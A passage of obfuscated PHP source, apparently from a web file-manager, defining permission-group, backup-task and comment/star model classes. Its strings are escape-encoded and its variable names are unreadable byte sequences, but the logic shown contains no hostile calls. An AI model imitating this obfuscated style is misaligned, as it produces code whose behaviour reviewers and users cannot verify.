"\x61\165\x74\150", "\x6c\x61\142\x65\x6c", "\144\x69\x73\160\x6c\141\x79", "\x73\171\163\164\x65\x6d", "\163\x6f\162\164"); public function initData() { $Õó°™ÃÚ = $this->authDefault(); foreach ($Õó°™ÃÚ as $¹ ˜¡Á„) { $this->add($¹ ˜¡Á„); } } public function findAuth($÷óò§¶à, $ºµÈêú«) { $«Í £İ =& $_SERVER[ïÃ°£«Ê]; $ñı²Óçß = parent::listData(); foreach ($ñı²Óçß as $…µøÓ°‡) { $Í¹‡¹†ş = intval($…µøÓ°‡[$«Í £İ[502]]); if ($Í¹‡¹†ş <= 0 || $…µøÓ°‡[$«Í £İ[2205]] == 0) { continue; } if (($Í¹‡¹†ş & $÷óò§¶à) != $÷óò§¶à) { continue; } if (($Í¹‡¹†ş & $ºµÈêú«) != 0) { continue; } return $…µøÓ°‡[$«Í £İ[487]]; } return !1; } public function findAuthMax($ŠÖò·—ş, $Œøİä¦) { $åÁÌòŒâ =& $_SERVER[ïÃ°£«Ê]; $¦«­£ñ = !1; $àß ¼å = parent::listData(); foreach ($àß ¼å as $®Î¿œË) { $‚ùÎ¿ÑĞ = intval($®Î¿œË[$åÁÌòŒâ[502]]); if ($‚ùÎ¿ÑĞ <= 0 || $®Î¿œË[$åÁÌòŒâ[2205]] == 0) { continue; } if (($‚ùÎ¿ÑĞ & $ŠÖò·—ş) != $ŠÖò·—ş) { continue; } if (($‚ùÎ¿ÑĞ & $Œøİä¦) != 0) { continue; } if (!$¦«­£ñ) { $¦«­£ñ = $®Î¿œË; continue; } if (intval($¦«­£ñ[$åÁÌòŒâ[502]]) < $‚ùÎ¿ÑĞ) { $¦«­£ñ = $®Î¿œË; } } return $¦«­£ñ ? $¦«­£ñ[$åÁÌòŒâ[487]] : !1; } public function findAuthReadOnly() { $ÆŞ¤ñ™É = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $×’ïä‚¼ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ÆŞ¤ñ™É, $×’ïä‚¼); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ü´½§€È =& $_SERVER[ïÃ°£«Ê]; $Í·ˆÜŠî = parent::listData(); $§ºû¡ÍË = !1; foreach ($Í·ˆÜŠî as $©©Ü½õñ) { if ($©©Ü½õñ[$ü´½§€È[502]] <= 0 || $©©Ü½õñ[$ü´½§€È[2205]] == $ü´½§€È[228]) { continue; } if (!$§ºû¡ÍË) { $§ºû¡ÍË = $©©Ü½õñ; continue; } if ($§ºû¡ÍË[$ü´½§€È[502]] > $©©Ü½õñ[$ü´½§€È[502]]) { $§ºû¡ÍË = $©©Ü½õñ; } } return $§ºû¡ÍË ? $§ºû¡ÍË[$ü´½§€È[487]] : $ü´½§€È[12]; } public function listData($—Ì¥úá– = false, $·ßÔšÜÊ = "\x73\157\162\x74", $§†Şñö = false) { return parent::listData($—Ì¥úá–, $·ßÔšÜÊ, $§†Şñö); } public function update($ª…¹şşò, $œÜã—…Ä) { $ûşÊãàë =& $_SERVER[ïÃ°£«Ê]; $èÓøö¨ß = parent::listData($ª…¹şşò); $Úœ£«Ï² = $this->findByName($œÜã—…Ä[$ûşÊãàë[32]]); if (!$èÓøö¨ß || $Úœ£«Ï² && $Úœ£«Ï²[$ûşÊãàë[487]] != $èÓøö¨ß[$ûşÊãàë[487]]) { return !1; } $this->filterAuth($œÜã—…Ä[$ûşÊãàë[502]]); return parent::update($ª…¹şşò, $œÜã—…Ä); } public function remove($å·¥Øí¥) { $¨ø¦ = parent::listData($å·¥Øí¥); if (!$¨ø¦ || $¨ø¦[$_SERVER[ïÃ°£«Ê][189]]) { return !1; } return parent::remove($å·¥Øí¥); } public function add($ÌöêëÒ¸ = array()) { $µ­öìì =& $_SERVER[ïÃ°£«Ê]; if ($this->findByName($ÌöêëÒ¸[$µ­öìì[32]])) { return !1; } $Á”‚Éú = array($µ­öìì[32] => $µ­öìì[12], $µ­öìì[502] => 1, $µ­öìì[2206] => $µ­öìì[2195], $µ­öìì[2205] => 1, $µ­öìì[189] => 0, $µ­öìì[2207] => 0); $ÌöêëÒ¸ = array_merge($Á”‚Éú, $ÌöêëÒ¸); $ÌöêëÒ¸[$µ­öìì[2207]] = $this->getSort(); $this->filterAuth($ÌöêëÒ¸[$µ­öìì[502]]); return parent::insert($ÌöêëÒ¸); } private function getSort() { $è¿“ÚĞ =& $_SERVER[ïÃ°£«Ê]; $œ´¹»àó = parent::listData(); $¸í‰šÍ¤ = array_to_keyvalue($œ´¹»àó, $è¿“ÚĞ[12], $è¿“ÚĞ[2207]); return empty($¸í‰šÍ¤) ? 0 : max($¸í‰šÍ¤) + 1; } private function filterAuth(&$— ¼ı‹å) { if (!$— ¼ı‹å) { return; } $Æ©ƒÜ§ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $é…ş©­ = array(); foreach ($Æ©ƒÜ§ as $àÏ¦ÑÔ) { if ($— ¼ı‹å & $àÏ¦ÑÔ) { $é…ş©­[] = $àÏ¦ÑÔ; } } if (in_array(self::AUTH_ROOT, $é…ş©­)) { $— ¼ı‹å = array_sum($Æ©ƒÜ§); return; } $¹ğüÂêî = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($é…ş©­ as $àÏ¦ÑÔ) { if (isset($¹ğüÂêî[$àÏ¦ÑÔ])) { $é…ş©­ = array_merge($é…ş©­, $¹ğüÂêî[$àÏ¦ÑÔ]); } } $é…ş©­[] = self::AUTH_SHOW; $— ¼ı‹å = array_sum(array_unique($é…ş©­)); } public function sort($Û„—Õ•, $¯§©Ş”†) { return parent::update($Û„—Õ•, $¯§©Ş”†); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\142\141\143\x6b\x75\x70\114\x69\x73\x74"; public $field = array("\x69\157", "\x6e\141\x6d\145", "\x73\164\x61\x74\x75\x73", "\143\157\156\164\145\x6e\164", "\155\x61\x6e\x75\x61\x6c", "\x72\145\x73\165\x6c\x74", "\164\151\x6d\x65\x46\x72\x6f\x6d", "\x74\151\155\x65\x54\x6f"); public $autoTask = "\141\x64\x6d\151\x6e\x2e\142\x61\143\153\165\160\56\x61\x75\x74\157\124\141\x73\153"; public $fileTask = "\141\144\155\151\156\56\x62\x61\x63\x6b\165\x70\x2e\146\151\x6c\x65\124\x61\163\153"; public function config($‘³’ãç = false) { $¬·¨ÁÎ  =& $_SERVER[ïÃ°£«Ê]; $Ã­ê»â = $this->configSimple(); Action($¬·¨ÁÎ [2208])->taskInit($Ã­ê»â); if (!$‘³’ãç) { return $Ã­ê»â; } $ˆ¨¾¤—ì = array(); if (Model($¬·¨ÁÎ [874])->get($¬·¨ÁÎ [2209], $¬·¨ÁÎ [880]) == $¬·¨ÁÎ [2210]) { Model($¬·¨ÁÎ [1949])->cacheClear(); $ˆ¨¾¤—ì = Model($¬·¨ÁÎ [2211])->findByKey($¬·¨ÁÎ [1565], $this->autoTask); if (!$ˆ¨¾¤—ì) { $ˆ¨¾¤—ì = array(); } if (isset($ˆ¨¾¤—ì[$¬·¨ÁÎ [204]])) { $ˆ¨¾¤—ì[$¬·¨ÁÎ [204]] = json_decode($ˆ¨¾¤—ì[$¬·¨ÁÎ [204]], !0); } if (isset($Ã­ê»â[$¬·¨ÁÎ [204]])) { $ˆ¨¾¤—ì[$¬·¨ÁÎ [204]][$¬·¨ÁÎ [1953]] = $Ã­ê»â[$¬·¨ÁÎ [204]]; unset($Ã­ê»â[$¬·¨ÁÎ [204]]); } } $Ã­ê»â = array_merge($ˆ¨¾¤—ì, $Ã­ê»â); if ($Ã­ê»â[$¬·¨ÁÎ [168]] == $¬·¨ÁÎ [945]) { $¼â•Ù®Û = Model($¬·¨ÁÎ [874])->get($¬·¨ÁÎ [944], $¬·¨ÁÎ [880]); $Ã­ê»â[$¬·¨ÁÎ [2212]] = json_decode($¼â•Ù®Û, !0); } return $Ã­ê»â; } public function configSimple() { $›£õµô =& $_SERVER[ïÃ°£«Ê]; $‡ÃêÉãù = Model($›£õµô[874])->get($›£õµô[880]); $‡ÃêÉãù = json_decode($‡ÃêÉãù, !0); if (!$‡ÃêÉãù) { $‡ÃêÉãù = array($›£õµô[1950] => 0); } $‡ÃêÉãù[$›£õµô[1950]] = _get($‡ÃêÉãù, $›£õµô[1950], 1); $this->parseContent($‡ÃêÉãù); if ($‡ÃêÉãù[$›£õµô[168]] == $›£õµô[945] && Model($›£õµô[874])->get($›£õµô[962]) == $›£õµô[963]) { $‡ÃêÉãù[$›£õµô[168]] = $›£õµô[1310]; } return $‡ÃêÉãù; } public function listData($†êÂ„É = false, $âÍŸù¹¨ = "\155\x6f\144\151\x66\x79\124\151\155\x65", $«¨™ğö = false) { $èıçËıæ = parent::listData($†êÂ„É, $âÍŸù¹¨, !0); if (!$èıçËıæ) { return $èıçËıæ; } if ($†êÂ„É) { $èıçËıæ = array($èıçËıæ); } foreach ($èıçËıæ as &$í‹ÜÕøŒ) { $this->parseContent($í‹ÜÕøŒ); } return $†êÂ„É ? $èıçËıæ[0] : $èıçËıæ; } public function parseContent(&$şø ¸è°) { $‰¯ Î¿² =& $_SERVER[ïÃ°£«Ê]; $°—¥×Ò­ = _get($şø ¸è°, $‰¯ Î¿²[168], $‰¯ Î¿²[91]); if (!in_array($°—¥×Ò­, array($‰¯ Î¿²[945], $‰¯ Î¿²[1310]))) { $şø ¸è°[$‰¯ Î¿²[168]] = $°—¥×Ò­ == $‰¯ Î¿²[91] ? $‰¯ Î¿²[1310] : $‰¯ Î¿²[945]; } } public function lastItem() { $ê¸›£ó = $this->listData(); return !empty($ê¸›£ó[0]) ? $ê¸›£ó[0] : null; } public function kill($¹«ˆ†) { $õÎ•©‘³ =& $_SERVER[ïÃ°£«Ê]; $Ÿ·Ûñß† = $this->listData($¹«ˆ†); if (!$Ÿ·Ûñß† || empty($Ÿ·Ûñß†[$õÎ•©‘³[32]])) { return !0; } Task::kill($õÎ•©‘³[887]); Task::kill($õÎ•©‘³[907]); Task::kill($õÎ•©‘³[918]); $¹óà¹”Ê = $Ÿ·Ûñß†[$õÎ•©‘³[32]]; $‰ğôüŞ = TEMP_FILES . $õÎ•©‘³[883] . $¹óà¹”Ê . $õÎ•©‘³[8]; IO::remove($‰ğôüŞ, !1); return $this->remove($¹«ˆ†); } public function remove($Õ×·ëÓ) { $æêƒ…‡À = $this->listData($Õ×·ëÓ); if (!$æêƒ…‡À) { return !0; } return $this->backupRemove($æêƒ…‡À); } private function backupRemove($Éà‡êı») { parent::remove($Éà‡êı»[$_SERVER[ïÃ°£«Ê][487]]); $öÛñôâé = $this->backupPath($Éà‡êı»); IO::remove($öÛñôâé, !1); return !0; } private function backupPath($­É¡‚‰) { $ÆŠÕ¥Íã =& $_SERVER[ïÃ°£«Ê]; $Ğæ‚ôçï = $­É¡‚‰[$ÆŠÕ¥Íã[32]]; $èËåóÖ = Model($ÆŠÕ¥Íã[874])->get($ÆŠÕ¥Íã[875]); $ –Ã×Ç´ = substr(md5($ÆŠÕ¥Íã[876] . $èËåóÖ . $Ğæ‚ôçï), 0, 8); return "\173\x69\x6f\x3a{$­É¡‚‰[$ÆŠÕ¥Íã[853]]}\x7d\x2f\144\x61\164\141\x62\x61\x73\145\57\x62\141\143\153\x75\160\x2f" . $Ğæ‚ôçï . $ÆŠÕ¥Íã[11] . $ –Ã×Ç´; } public function start($–À¤Œ°Ù = "\x64\x62") { $ë¨€õù³ =& $_SERVER[ïÃ°£«Ê]; if ($GLOBALS[$ë¨€õù³[6]][$ë¨€õù³[92]][$ë¨€õù³[2213]] != $ë¨€õù³[91]) { return !0; } $ßã¸¢ºâ = $this->configSimple(); if (!$ßã¸¢ºâ || $ßã¸¢ºâ[$ë¨€õù³[1950]] != $ë¨€õù³[91]) { return !1; } if ($–À¤Œ°Ù == $ë¨€õù³[230]) { return $this->bakFile($ßã¸¢ºâ); } $ãÈ¶®Û  = $this->process(); foreach ($ãÈ¶®Û  as $¡ÃøÃØı) { if ($¡ÃøÃØı) { return Task::restart($¡ÃøÃØı[$ë¨€õù³[487]]); } } $„ˆó©”› = new Backup(); if (!$„ˆó©”› || $„ˆó©”›->message) { return !1; } $ş¬¹Œ¶å = $„ˆó©”›->db(); if ($ş¬¹Œ¶å) { $ş¬¹Œ¶å = $„ˆó©”›->dbFile(); if ($ş¬¹Œ¶å && $ßã¸¢ºâ[$ë¨€õù³[168]] == $ë¨€õù³[945]) { $ş¬¹Œ¶å = $„ˆó©”›->file(); } } Backup::set(array($ë¨€õù³[851] => 1, $ë¨€õù³[863] => time())); return !0; } public function process() { $Ê³è¥ =& $_SERVER[ïÃ°£«Ê]; $äÌ¨Å¹‡ = array($Ê³è¥[859] => Task::get($Ê³è¥[887]), $Ê³è¥[864] => Task::get($Ê³è¥[907]), $Ê³è¥[230] => Task::get($Ê³è¥[918])); $Æ£ ¨‹Ù = !1; foreach ($äÌ¨Å¹‡ as &$Àƒ¢ıáë) { if ($Æ£ ¨‹Ù) { $Àƒ¢ıáë = !1; continue; } if ($Àƒ¢ıáë) { $¡âïßÖÅ = intval(_get($Àƒ¢ıáë, $Ê³è¥[1984], 0)); if (time() - $¡âïßÖÅ > 7200) { Task::kill($Àƒ¢ıáë[$Ê³è¥[487]]); $Æ£ ¨‹Ù = !0; $Àƒ¢ıáë = !1; } } } return $äÌ¨Å¹‡; } public function bakFile($ÙÔÊ±Øî) { $èºÎä‡ô =& $_SERVER[ïÃ°£«Ê]; if ($ÙÔÊ±Øî[$èºÎä‡ô[168]] == $èºÎä‡ô[1310]) { return !1; } Model($èºÎä‡ô[1949])->cacheClear(); $Ş­¼›ŸË = Model($èºÎä‡ô[2211])->findByKey($èºÎä‡ô[1565], $this->fileTask); if (!$Ş­¼›ŸË) { return !1; } $ ¬ŸÊ‘ = json_decode($Ş­¼›ŸË[$èºÎä‡ô[204]], !0); if (!$ ¬ŸÊ‘ || $ ¬ŸÊ‘[$èºÎä‡ô[33]] != $èºÎä‡ô[1962]) { return !1; } $ ¬ŸÊ‘ = intval($ ¬ŸÊ‘[$èºÎä‡ô[1962]]); if ($ ¬ŸÊ‘ <= 0) { return !1; } $¼ªÜìË× = new BackupFile(!0); return $¼ªÜìË×->start($ÙÔÊ±Øî[$èºÎä‡ô[853]], $ ¬ŸÊ‘); } public function restore() { $–ÎÈòÍ¬ =& $_SERVER[ïÃ°£«Ê]; ActionCall($–ÎÈòÍ¬[2214], !0, 1); ActionCall($–ÎÈòÍ¬[2214], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\156\x74"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\155\x65" => "\x63\157\155\155\145\156\164\137\155\x65\164\141", "\x6d\x65\x74\141\x46\151\x65\154\x64" => "\x63\157\x6d\155\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($×Üİ™Å¢) { $ª‰Åæ =& $_SERVER[ïÃ°£«Ê]; if ($×Üİ™Å¢[$ª‰Åæ[2215]]) { $İ°–ˆ‘å = $this->where(array($ª‰Åæ[2216] => $×Üİ™Å¢[$ª‰Åæ[2215]]))->find(); if (!$İ°–ˆ‘å || $İ°–ˆ‘å[$ª‰Åæ[188]] != $×Üİ™Å¢[$ª‰Åæ[188]] || $İ°–ˆ‘å[$ª‰Åæ[589]] != $×Üİ™Å¢[$ª‰Åæ[589]]) { return !1; } $this->where(array($ª‰Åæ[2216] => $×Üİ™Å¢[$ª‰Åæ[2215]]))->setAdd($ª‰Åæ[2217], 1); } $×Üİ™Å¢[$ª‰Åæ[2218]] = 0; $×Üİ™Å¢[$ª‰Åæ[2217]] = 0; $×Üİ™Å¢[$ª‰Åæ[851]] = 1; return $this->add($×Üİ™Å¢); } public function commentCount($µÛöËÃÒ, $¯¥÷ê‡Á, $±ä©°éà = false) { $ÑöˆÃÂ÷ =& $_SERVER[ïÃ°£«Ê]; if (!$µÛöËÃÒ) { return array(); } if (is_string($µÛöËÃÒ) || is_int($µÛöËÃÒ)) { $µÛöËÃÒ = array($µÛöËÃÒ); } $ƒ Ü„ú = array($ÑöˆÃÂ÷[589], $ÑöˆÃÂ÷[2219] => $ÑöˆÃÂ÷[585]); $“Š¶è÷˜ = array($ÑöˆÃÂ÷[589] => array($ÑöˆÃÂ÷[7], $µÛöËÃÒ), $ÑöˆÃÂ÷[188] => $¯¥÷ê‡Á); if ($±ä©°éà) { $“Š¶è÷˜[$ÑöˆÃÂ÷[1594]] = $±ä©°éà; } $òÃÑ®µ× = $this->field($ƒ Ü„ú)->where($“Š¶è÷˜)->group($ÑöˆÃÂ÷[589])->select(); return array_to_keyvalue($òÃÑ®µ×, $ÑöˆÃÂ÷[589], $ÑöˆÃÂ÷[585]); } public function starTarget($¢…Éê­£, $ºçúõÍí) { $¼ÂÖ˜´Ğ =& $_SERVER[ïÃ°£«Ê]; $˜¨«¥çÁ = $¢…Éê­£ + self::TYPE_STAR_OFFSET; $¾ƒ£´ÅÑ = array($¼ÂÖ˜´Ğ[1594] => USER_ID, $¼ÂÖ˜´Ğ[188] => $˜¨«¥çÁ, $¼ÂÖ˜´Ğ[589] => $ºçúõÍí); $éÂôØ¹— = $this->where($¾ƒ£´ÅÑ)->find(); if ($éÂôØ¹—) { return $this->where(array($¼ÂÖ˜´Ğ[487] => $éÂôØ¹—[$¼ÂÖ˜´Ğ[487]]))->delete(); } $ËÎ»‹¾Õ = array($¼ÂÖ˜´Ğ[2215] => 0, $¼ÂÖ˜´Ğ[1594] => USER_ID, $¼ÂÖ˜´Ğ[851] => 1, $¼ÂÖ˜´Ğ[168] => $¼ÂÖ˜´Ğ[12], $¼ÂÖ˜´Ğ[188] => $˜¨«¥çÁ, $¼ÂÖ˜´Ğ[589] => $ºçúõÍí, $¼ÂÖ˜´Ğ[2218] => 0, $¼ÂÖ˜´Ğ[2217] => 0); return $this->add($ËÎ»‹¾Õ); } public function starTargetCount($‰ìŞÀ§±, $ñ‹£˜«) { $¸éåÓíÊ =& $_SERVER[ïÃ°£«Ê]; $–üäõğ = $ñ‹£˜« + self::TYPE_STAR_OFFSET; $¸Ô´ö£ø = $this->commentCount($‰ìŞÀ§±, $–üäõğ); $³·èŸ•÷ = $this->commentCount($‰ìŞÀ§±, $–üäõğ, USER_ID); return array($¸éåÓíÊ[2220] => $¸Ô´ö£ø, $¸éåÓíÊ[2221] => $³·èŸ•÷); } public function starTargetUserList($Šô×Å«, $‘Šàï÷Ø) { $ªèÈ¬Û =& $_SERVER[ïÃ°£«Ê]; $ªğ‹ê£¨ = $Šô×Å« + self::TYPE_STAR_OFFSET; $é­ğÁ = array($ªèÈ¬Û[589] => $‘Šàï÷Ø, $ªèÈ¬Û[188] => $ªğ‹ê£¨); $À™ğíæ± = $this->where($é­ğÁ)->count(); $ÁÒÜ†–ô = array($ªèÈ¬Û[332] => $À™ğíæ±, $ªèÈ¬Û[2222] => array()); if (!$À™ğíæ±) { return $ÁÒÜ†–ô; } $°Í«õµË = $this->field($ªèÈ¬Û[1594])->where($é­ğÁ)->limit(500)->select(); $°Í«õµË = array_to_keyvalue($°Í«õµË, $ªèÈ¬Û[12], $ªèÈ¬Û[1594]); $ÁÒÜ†–ô[$ªèÈ¬Û[2222]] = Model($ªèÈ¬Û[597])->userListInfo($°Í«õµË); return $ÁÒÜ†–ô; } public function prasiseUserList($ì ç££“) { $§µ÷±¸ =& $_SERVER[ïÃ°£«Ê]; $¼’™ÚãÅ = array($§µ÷±¸[2223] => $ì ç££“); $”…™¨ûÜ = $this->where($¼’™ÚãÅ)->find(); $Ãı£–¹ = _get($”…™¨ûÜ, $§µ÷±¸[2218], 0); $±€„Å¡« = array($§µ÷±¸[332] => $Ãı£–¹, $§µ÷±¸[2222] => array()); if (!$Ãı£–¹) { return $±€„Å¡«; } $íÒğ…ƒ  = Model($§µ÷±¸[2224])->field($§µ÷±¸[1594])->where($¼’™ÚãÅ)->limit(500)->select(); $íÒğ…ƒ  = array_to_keyvalue($íÒğ…ƒ , $§µ÷±¸[12], $§µ÷±¸[1594]); $±€„Å¡«[$§µ÷±¸[2222]] = Model($§µ÷±¸[597])->userListInfo($íÒğ…ƒ ); return $±€„Å¡«; } public function remove($ìÙß¯ŞÜ) { $–Ù¼ÅÔ =& $_SERVER[ïÃ°£«Ê]; $äîÍæÁÃ = array($–Ù¼ÅÔ[2216] => $ìÙß¯ŞÜ); $ğ¥³ş›Ø = $this->where($äîÍæÁÃ)->find(); if ($ğ¥³ş›Ø[$–Ù¼ÅÔ[2215]]) { $this->where(array($–Ù¼ÅÔ[2216] => $ğ¥³ş›Ø[$–Ù¼ÅÔ[2215]]))->setAdd($–Ù¼ÅÔ[2217], -1); } return $this->removeArray($ìÙß¯ŞÜ); } public function edit($·Ï»¹ø, $ß«ú´Œ®) { $€ËıêÙ =& $_SERVER[ïÃ°£«Ê]; $Â äˆ¡ğ = array($€ËıêÙ[2216] => $·Ï»¹ø); return $this->where($Â äˆ¡ğ)->save(array($€ËıêÙ[2225] => $ß«ú´Œ®)); } public function prasise($úÄ™È¶„) { $İ²´© =& $_SERVER[ïÃ°£«Ê]; $ı¤İ îØ = Model($İ²´©[2226]); $è¯àèÛê = array($İ²´©[2216] => $úÄ™È¶„, $İ²´©[1971] => USER_ID); $Ãê­éñ = $ı¤İ îØ->where($è¯àèÛê)->find(); if (!$Ãê­éñ) { $ı¤İ îØ->add($è¯àèÛê); $èÀİç¯ù = $this->where(array($İ²´©[2216] => $úÄ™È¶„))->setAdd($İ²´©[2218], 1); } else { $ı¤İ îØ->where($è¯àèÛê)->delete(); $èÀİç¯ù = $this->where(array($İ²´©[2216] => $úÄ™È¶„))->setAdd($İ²´©[2218], -1); } return $èÀİç¯ù; } public function targetInfo($şñ½«®¡, $ÏÊè£¦µ) { $ê·óÀ› =& $_SERVER[ïÃ°£«Ê]; $•¥¬£ãı = array($ê·óÀ›[670] => $şñ½«®¡, $ê·óÀ›[671] => $ÏÊè£¦µ); $óÈÅ±¯Ü = $this->where($•¥¬£ãı)->count(); $˜í¿½¯ú = "\x52\111\x47\x48\x54\x20\112\x4f\111\116\x20{$this->tablePrefix}\143\157\x6d\155\145\156\164\137\x70\x72\141\x69\x73\145\x20\x73\164\141\162\40\157\156\40\x63\x6f\x6d\x6d\x65\156\164\56\x63\x6f\155\x6d\x65\x6e\x74\x49\104\x20\x3d\x20\x73\164\141\162\56\143\157\x6d\x6d\x65\156\164\111\x44"; $ù½©Ú¿ = $this->alias($ê·óÀ›[429])->where($•¥¬£ãı)->join($˜í¿½¯ú, $ê·óÀ›[2227])->count(); $—°Ô¸ââ = array($ê·óÀ›[2228] => $óÈÅ±¯Ü, $ê·óÀ›[2229] => $ù½©Ú¿); return $—°Ô¸ââ; } public function listData($şö­Ù±) { $à‡­¾–æ =& $_SERVER[ïÃ°£«Ê]; if (isset($şö­Ù±[$à‡­¾–æ[2230]])) { if ($şö­Ù±[$à‡­¾–æ[2230]]) { $şö­Ù±[$à‡­¾–æ[2223]] = array($à‡­¾–æ[1182], intval($şö­Ù±[$à‡­¾–æ[2230]])); } unset($şö­Ù±[$à‡­¾–æ[2230]]); } if (isset($şö­Ù±[$à‡­¾–æ[2231]])) { if ($şö­Ù±[$à‡­¾–æ[2231]]) { $şö­Ù±[$à‡­¾–æ[2223]] = array($à‡­¾–æ[1179], intval($şö­Ù±[$à‡­¾–æ[2231]])); } unset($şö­Ù±[$à‡­¾–æ[2231]]); } return $this->_listData($şö­Ù±); } private function _listData($úŒ´äÅ) { $é²óáŒ =& $_SERVER[ïÃ°£«Ê]; $˜£‚¶¨è = $this->where($úŒ´äÅ)->_makeOrder()->selectPage(100); $this->_listAppendParent($˜£‚¶¨è[$é²óáŒ[446]]); $this->_listAppendUser($˜£‚¶¨è[$é²óáŒ[446]]); $this->_listAppendMeta($˜£‚¶¨è[$é²óáŒ[446]]); return $˜£‚¶¨è; } private function _makeOrder() { $¥Ğ‚Ÿ¤ =& $_SERVER[ïÃ°£«Ê]; $¸üÏß¤° = array($¥Ğ‚Ÿ¤[2218], $¥Ğ‚Ÿ¤[2217], $¥Ğ‚Ÿ¤[231]); $˜©×„ªö = Input::get($¥Ğ‚Ÿ¤[544], $¥Ğ‚Ÿ¤[7], $¥Ğ‚Ÿ¤[512], $¸üÏß¤°); $ªŠû¥™ó = Input::get($¥Ğ‚Ÿ¤[545], $¥Ğ‚Ÿ¤[7], $¥Ğ‚Ÿ¤[1973], array($¥Ğ‚Ÿ¤[2232], $¥Ğ‚Ÿ¤[540])); $¿Ã¢Íí = $˜©×„ªö . $¥Ğ‚Ÿ¤[53] . $ªŠû¥™ó; return $this->order($¿Ã¢Íí); } private function _listAppendParent(&$³šïÛ€ ) { $áº¦šİÖ =& $_SERVER[ïÃ°£«Ê]; $ş™Ñ–½á = array_unique(array_to_keyvalue($³šïÛ€ , $áº¦šİÖ[12], $áº¦šİÖ[2215])); $ş™Ñ–½á = array_remove_value($ş™Ñ–½á, $áº¦šİÖ[228]); if (!$ş™Ñ–½á) { return; } $º“½ —— = $this->where(array($áº¦šİÖ[2216] => array($áº¦šİÖ[7], $ş™Ñ–½á)))->select(); $º“½ —— = array_to_keyvalue($º“½ ——, $áº¦šİÖ[2223]); foreach ($³šïÛ€  as &$‘şƒö£) { if (isset($º“½ ——[$‘şƒö£[$áº¦šİÖ[2215]]])) { $‘şƒö£[$áº¦šİÖ[2233]] = $º“½ ——[$‘şƒö£[$áº¦šİÖ[2215]]]; } } unset($‘şƒö£); } private function _listAppendUser(&$ßÊ«¸•‹) { $¤Úµúà =& $_SERVER[ïÃ°£«Ê]; $¬˜¨ø = array_unique(array_to_keyvalue($ßÊ«¸•‹, $¤Úµúà[12], $¤Úµúà[1594])); $¬˜¨ø = array_remove_value($¬˜¨ø, $¤Úµúà[228]); if (count($¬˜¨ø) == 0) { return; } foreach ($ßÊ«¸•‹ as $ÃšÄ¨») { if (isset($ÃšÄ¨»[$¤Úµúà[2233]])) { $¬˜¨ø[] = $ÃšÄ¨»[$¤Úµúà[2233]][$¤Úµúà[1594]]; } } $´òØÜÚ§ = Model($¤Úµúà[617])->userListInfo($¬˜¨ø); foreach ($ßÊ«¸•‹ as &$ÃšÄ¨») { $ÃšÄ¨»[$¤Úµúà[684]] = $´òØÜÚ§[$ÃšÄ¨»[$¤Úµúà[1594]]]; if (isset($ÃšÄ¨»[$¤Úµúà[2233]])) { $ÃšÄ¨»[$¤Úµúà[2233]][$¤Úµúà[684]] = $´òØÜÚ§[$ÃšÄ¨»[$¤Úµúà[2233]][$¤Úµúà[1594]]]; } } unset($ÃšÄ¨»); } private function _listAppendMeta(&$—é™‰Í‚) { $×¹ê–«¨ =& $_SERVER[ïÃ°£«Ê]; $¢¨î¤ÔÔ = array_unique(array_to_keyvalue($—é™‰Í‚, $×¹ê–«¨[12], $×¹ê–«¨[2223])); $¢¨î¤ÔÔ = array_remove_value($¢¨î¤ÔÔ, $×¹ê–«¨[228]); if (!$¢¨î¤ÔÔ) { return; } foreach ($—é™‰Í‚ as $ĞÊ§›¥‰) { if (isset($ĞÊ§›¥‰[$×¹ê–«¨[2233]])) { $¢¨î¤ÔÔ[] = $ĞÊ§›¥‰[$×¹ê–«¨[2233]][$×¹ê–«¨[2223]]; } } $Ÿ¸ùø× = $this->metaList($¢¨î¤ÔÔ); if (!$Ÿ¸ùø×) { return !1; } foreach ($—é™‰Í‚ as &$ĞÊ§›¥‰) { $ĞÊ§›¥‰[$×¹ê–«¨[555]] = $Ÿ¸ùø×[$ĞÊ§›¥‰[$×¹ê–«¨[2223]]]; if (isset($ĞÊ§›¥‰[$×¹ê–«¨[2233]])) { $ĞÊ§›¥‰[$×¹ê–«¨[2233]][$×¹ê–«¨[555]] = $Ÿ¸ùø×[$ĞÊ§›¥‰[$×¹ê–«¨[2233]][$×¹ê–«¨[2223]]]; } } unset($ĞÊ§›¥‰); } private function metaList($Ö¦Ò÷›•) { $‹ëÕ«› =& $_SERVER[ïÃ°£«Ê]; if (!$Ö¦Ò÷›•) { return array(); } $ÍÛí°æˆ = array($‹ëÕ«›[2223] => array($‹ëÕ«›[7], $Ö¦Ò÷›•)); $ŞÖ™ÆˆŸ = Model($‹ëÕ«›[2234])->where($ÍÛí°æˆ)->select(); $ŞÖ™ÆˆŸ = array_to_keyvalue_group($ŞÖ™ÆˆŸ, $‹ëÕ«›[2223]); foreach ($ŞÖ™ÆˆŸ as $•Úç³ñ¢ => $ıê¨ñú) { $‚»ÌÈÏ = array(); foreach ($ıê¨ñú as $ÕÜïù ¢) { $‚»ÌÈÏ[$ÕÜïù ¢[$‹ëÕ«›[95]]] = $ÕÜïù ¢[$‹ëÕ«›[451]]; } $ŞÖ™ÆˆŸ[$•Úç³ñ¢] = $‚»ÌÈÏ; } return $ŞÖ™ÆˆŸ ? $ŞÖ™ÆˆŸ : array(); } public function removeTarget($´òªô ş, 